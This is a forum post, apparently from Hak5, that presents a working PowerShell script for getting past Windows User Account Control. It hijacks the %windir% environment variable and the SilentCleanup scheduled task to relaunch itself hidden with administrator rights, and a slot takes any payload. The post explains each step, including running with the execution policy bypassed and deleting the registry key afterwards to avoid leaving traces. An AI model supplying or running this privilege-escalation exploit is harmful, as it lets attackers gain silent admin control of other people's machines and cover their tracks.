# Windows-UAC-bypass
https://forums.hak5.org/topic/45439-powershell-real-uac-bypass/

Hi everyone!

First of all, sorry if my English is not that good, It's not my main language. I just signed up to the forum to post this, after watching the video Darren made about a payload that changes the Desktop background.

I had this idea after he mentioned that the Lockscreen background could not be changed due to the fact that there isn't a "stable" method and it needed admin privileges. So I made a script which, when opened as standard user, respawns itself in a hidden window with full admin privileges and executes whatever payload you put in it.

Here it is:

if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
    #Payload goes here
    #It'll run as Administrator
} else {
    $registryPath = "HKCU:\Environment"
    $Name = "windir"
    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
    Remove-ItemProperty -Path $registryPath -Name $name
}
 

Explanation:

There's a task in Task Scheduler called "SilentCleanup" which, while it's executed as Users, automatically runs with elevated privileges. When it runs, it executes the file 

%windir%\system32\cleanmgr.exe
Since it runs as Users, and we can control user's environment variables, we can change %windir% (normally pointing to C:\Windows) to point to whatever we want, and it'll run as admin.

 

The first line

if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544"))
basically checks if we are admin, so that the script can detect whether it has been called by the user or by the task, and do stuff accordingly. Everything that need admin privs goes in this block of the if statement, while in the "else" block goes what can be run as standard user, including the bypass itself.

The "Set-ItemProperty" line creates a new Registry Key "HKCU:\Environment\windir" in order to change the %windir% variable value to the command we want to be run as admin, in this case 

powershell -ep bypass -w h $PSCommandPath;#
"$PSCommandPath" evaluates to our script path, "-ep bypass" is equal to "-ExecutionPolicy bypass" and "-w h" to "-WindowStyle hidden". The ";#" part is needed to comment out the rest of the path of the task from the command. 

So, in the end, the task's execution path evaluates to:

powershell -ExecutionPolicy bypass -WindowStyle hidden <path of the script> ;#\System32\cleanmgr.exe
The "schtasks" command will simply ask Windows to run the task with the now modified %windir% and "Remove-ItemProperty" will just delete the reg key after the task has been executed in order to not break other things and/or leave traces of the "attack".

When the task runs, it will call the script with full fledged admin privs, so now the first block of the if statement is executed and our payload can do whatever we want.

Note: In order to work, the code must be saved in a script file somewhere, it cannot be run directly from powershell or from the run dialog. However, if our payload is small enough to fit entirely in the %windir% variable, we can reduce the whole script to just the three fundamental lines, i.e. "Set-ItemProperty", "schtasks" and "Remove-ItemProperty". (Idk if it can fit in the run dialog though)

Note2: I think it could break if the the script is in a path that contains spaces, but I think it's easily fixable by escaping the $PSCommandPath in the $Value variable
